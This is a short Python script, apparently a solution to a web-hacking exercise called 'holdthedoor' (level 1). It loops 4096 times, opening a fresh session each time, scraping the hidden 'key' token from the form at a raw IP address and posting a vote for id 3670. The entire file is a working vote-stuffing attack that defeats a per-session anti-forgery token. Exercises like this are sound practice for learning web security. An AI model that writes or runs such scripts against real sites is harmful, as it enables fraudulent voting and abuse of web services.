#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

datos = {'id':'3670', 'key':'true', 'holdthedoor':'\n'}
url = 'http://158.69.76.135/level1.php'

for i in range(4096):
    new_session = requests.Session()
    r = new_session.get(url)
    text = BeautifulSoup(r.text, 'html.parser')
    tags = text.select('input[name="key"]')
    tag = tags[0].get('value')
    datos['key'] = tag
    resp = new_session.post(url, data=datos)
    print("Vamos {} veces...".format(i))
    if resp.status_code == 200:
        pass
    else:
        print("We have an error here")
